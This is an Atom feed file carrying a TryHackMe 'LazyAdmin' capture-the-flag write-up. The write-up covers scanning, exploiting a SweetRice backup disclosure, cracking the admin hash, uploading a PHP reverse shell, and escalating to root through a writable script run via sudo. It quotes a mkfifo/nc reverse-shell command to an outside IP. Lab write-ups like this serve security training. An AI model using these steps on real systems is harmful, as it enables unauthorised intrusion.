@@ -1,0 +1,171 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+    <title>Writups - lazyadmin</title>
+    <subtitle>A diary dedicated to exploring the world of cybersecurity and technology.</subtitle>
+    <link href="https://theanxiuser.github.io/writups/tags/lazyadmin/atom.xml" rel="self" type="application/atom+xml"/>
+    <link href="https://theanxiuser.github.io/writups"/>
+    <generator uri="https://www.getzola.org/">Zola</generator>
+    <updated>2024-10-22T00:00:00+00:00</updated>
+    <id>https://theanxiuser.github.io/writups/tags/lazyadmin/atom.xml</id>
+    <entry xml:lang="en">
+        <title>LazyAdmin - TryHackMe Writup</title>
+        <published>2024-10-22T00:00:00+00:00</published>
+        <updated>2024-10-22T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://theanxiuser.github.io/writups/chapters/lazy-admin/" type="text/html"/>
+        <id>https://theanxiuser.github.io/writups/chapters/lazy-admin/</id>
+        
+        <content type="html">&lt;div style=&quot;display: flex; align-items: center;&quot;&gt;
+  &lt;div&gt;
+    &lt;img src=&quot;lazy_admin.jpeg&quot; alt=&quot;LazyAdmin&quot; width=&quot;100&quot;&#x2F;&gt;
+  &lt;&#x2F;div&gt;
+  &lt;div style=&quot;margin-left: 10px;&quot;&gt;
+    &lt;i&gt;Easy linux machine to practice your skills.&lt;&#x2F;i&gt;
+  &lt;&#x2F;div&gt;
+&lt;&#x2F;div&gt;
+&lt;h2 id=&quot;0-scanning&quot;&gt;0. Scanning&lt;&#x2F;h2&gt;
+&lt;p&gt;Target IP: 10.10.204.37&lt;&#x2F;p&gt;
+&lt;p&gt;2 ports are opened.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ nmap -sV -Pn 10.10.204.37 -v
+Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2024-10-11 16:46 +0545
+........
+PORT   STATE SERVICE VERSION
+22&#x2F;tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel
+&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;1-enumeration&quot;&gt;1. Enumeration&lt;&#x2F;h2&gt;
+&lt;p&gt;Enumerating port 80, we have default apache page. Now using gobuster to find out directories.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ gobuster dir -u http:&#x2F;&#x2F;10.10.204.37&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http:&#x2F;&#x2F;10.10.204.37&#x2F;
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster&#x2F;3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+&#x2F;content              (Status: 301) [Size: 314] [--&gt; http:&#x2F;&#x2F;10.10.204.37&#x2F;content&#x2F;]
+.....
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Looking into &lt;code&gt;&#x2F;content&lt;&#x2F;code&gt; page, we have &lt;code&gt;SweetRice notice&lt;&#x2F;code&gt;, this is the website management system.&lt;&#x2F;p&gt;
+&lt;p&gt;Looking for the exploit, we have the result&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;lazy-admin&#x2F;exploit_result.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Looking into backup disclosure exploit, we have following information about the exploit &lt;&#x2F;p&gt;
+&lt;pre&gt;
+Title: SweetRice 1.5.1 - Backup Disclosure
+Application: SweetRice
+Versions Affected: 1.5.1
+Vendor URL: http:&#x2F;&#x2F;www.basic-cms.org&#x2F;
+Software URL: http:&#x2F;&#x2F;www.basic-cms.org&#x2F;attachment&#x2F;sweetrice-1.5.1.zip
+Discovered by: Ashiyane Digital Security Team
+Tested on: Windows 10
+Bugs: Backup Disclosure
+Date: 16-Sept-2016
+
+
+Proof of Concept :
+
+You can access to all mysql backup and download them from this directory.
+http:&#x2F;&#x2F;localhost&#x2F;inc&#x2F;mysql_backup
+
+and can access to website files backup from:
+http:&#x2F;&#x2F;localhost&#x2F;SweetRice-transfer.zip
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Now looking into the mysql_backup dir, there is mysql backup. On the 79 th line of the file, we have what we needed for now, there is admin name and its password in hash format.&lt;&#x2F;p&gt;
+&lt;p&gt;Like &lt;code&gt;inc&lt;&#x2F;code&gt; dir we can have others too, so finding dir in &lt;code&gt;&#x2F;content&lt;&#x2F;code&gt;, we have &lt;code&gt;as&lt;&#x2F;code&gt; dir. This is the admin login page.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;lazy-admin&#x2F;admin_login.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;2-exploitation&quot;&gt;2. Exploitation&lt;&#x2F;h2&gt;
+&lt;p&gt;Break the earlier hash, and login with username and password.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+username: ma*****
+password hash: 42f749ade7f9e195bf475f**********
+password: Passw******
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Cracked using john, &lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;john --format=raw-MD5 --wordlist=&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt password.hash&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;We looged in into the admin panel.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;lazy-admin&#x2F;admin_panel_poc.png&quot; alt=&quot;alt text&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;I&#x27;m using media center to upload the reverse shell exploit, provided by &lt;code&gt;pentestmonkey&lt;&#x2F;code&gt;. I changed IP address and uploaded there. Maybe need to change the extension, made &lt;code&gt;phtml&lt;&#x2F;code&gt; and the file uploaded there.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;3-gaining-access&quot;&gt;3. Gaining Access&lt;&#x2F;h2&gt;
+&lt;p&gt;Now setup nc listening on port &lt;code&gt;1234&lt;&#x2F;code&gt; in my host machine, and executing the exploit we will get the connection.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+❯ nc -lvnp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.204.37 37452
+Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU&#x2F;Linux
+ 14:57:51 up 57 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+&#x2F;bin&#x2F;sh: 0: can&#x27;t access tty; job control turned off
+$ whoami
+www-data
+&lt;&#x2F;pre&gt;
+&lt;p&gt;We got the user flag as&lt;&#x2F;p&gt;
+&lt;pre&gt;
+$ ls &#x2F;home
+itguy
+$ ls &#x2F;home&#x2F;itguy
+Desktop
+Documents
+Downloads
+Music
+Pictures
+Public
+Templates
+Videos
+backup.pl
+examples.desktop
+mysql_login.txt
+user.txt
+$ cat &#x2F;home&#x2F;itguy&#x2F;user.txt
+THM{63e5bce9271952aad1**************}
+&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;4-privilege-escalation&quot;&gt;4. Privilege Escalation&lt;&#x2F;h2&gt;
+&lt;p&gt;It seems we can run perl, and can be use sudo so this is a good chance to esclate privilege.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+$ sudo -l
+Matching Defaults entries for www-data on THM-Chal:
+    env_reset, mail_badpass, secure_path=&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin
+
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;perl &#x2F;home&#x2F;itguy&#x2F;backup.pl
+&lt;&#x2F;pre&gt;
+&lt;p&gt;We have this code inside the &lt;code&gt;backup.pl&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;pre&gt;
+$ cat &#x2F;home&#x2F;itguy&#x2F;backup.pl
+#!&#x2F;usr&#x2F;bin&#x2F;perl
+
+system(&quot;sh&quot;, &quot;&#x2F;etc&#x2F;copy.sh&quot;);
+$ cat &#x2F;etc&#x2F;copy.sh
+rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.0.190 5554 &gt;&#x2F;tmp&#x2F;f
+$ ls -l &#x2F;etc&#x2F;copy.sh
+
+-rw-r--rwx 1 root root 81 Nov 29  2019 &#x2F;etc&#x2F;copy.sh
+&lt;&#x2F;pre&gt;
+&lt;p&gt;We have write permission to the file. Now need to change IP to my local IP, so that we can set the bind shell. Finally got connected to the target machine with user &lt;code&gt;root&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;Alternatively spawn the shell, which would be the root shell as ran with sudo, shown below.&lt;&#x2F;p&gt;
+&lt;pre&gt;
+$ echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; &#x2F;etc&#x2F;copy.sh
+$ sudo &#x2F;usr&#x2F;bin&#x2F;perl &#x2F;home&#x2F;itguy&#x2F;backup.pl
+whoami
+root
+cat &#x2F;root&#x2F;root.txt
+THM{6637f41d0177b6f37cb20d**********}
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Thats all, we got all the flags.&lt;&#x2F;p&gt;
+&lt;p&gt;Happy Hacking !!&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+</feed>
